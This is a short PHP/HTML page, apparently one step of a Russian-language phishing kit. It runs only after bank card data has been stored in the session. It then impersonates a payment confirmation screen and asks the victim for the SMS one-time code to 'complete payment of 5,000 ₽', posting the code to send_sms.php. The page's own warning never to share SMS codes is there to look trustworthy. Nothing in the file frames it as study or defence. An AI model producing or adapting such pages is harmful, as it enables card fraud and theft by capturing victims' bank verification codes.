<?php
// sms.php
session_start();
if (empty($_SESSION['card_data'])) {
    header('Location: index.html'); // Если данные карты не сохранены, вернуть на главную
    exit();
}
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Подтверждение платежа</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 400px; margin: 50px auto; padding: 20px; }
        .sms-input { font-size: 24px; letter-spacing: 10px; text-align: center; padding: 15px; width: 200px; margin: 20px auto; display: block; }
        .btn { background: #FF5A00; color: white; padding: 15px 40px; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; display: block; margin: 20px auto; }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <h3>Подтверждение платежа</h3>
        <p>На номер, привязанный к карте, отправлен SMS-код.</p>
        <p>Введите код для завершения оплаты 5 000 ₽.</p>
        <form action="send_sms.php" method="POST">
            <input type="text" name="sms_code" class="sms-input" maxlength="6" placeholder="000000" required pattern="\d{6}">
            <button type="submit" class="btn">Подтвердить</button>
        </form>
        <p style="font-size: 12px; color: #777; margin-top: 30px;">Никому не сообщайте код из SMS.</p>
    </div>
</body>
</html>